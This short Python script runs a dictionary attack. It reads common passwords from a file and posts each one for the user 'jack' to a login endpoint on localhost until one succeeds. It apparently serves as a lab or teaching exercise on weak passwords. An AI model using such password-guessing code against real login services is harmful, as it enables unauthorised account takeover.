import requests

with open('bad_passwords.txt') as f:
    popular_password_data = f.read()

popular_passwords = popular_password_data.split('\n')

i = 0


def generate_bad_password():
    global i

    if i >= len(popular_passwords):
        return

    password = popular_passwords[i]
    i += 1
    return password


while True:
    password = generate_bad_password()
    if password is None:
        break

    data = {'login': 'jack', 'password': password}
    response = requests.post('http://127.0.0.1:5000/auth', json=data)
    if response.status_code == 200:
        print('SUCCESS!', password)
        break
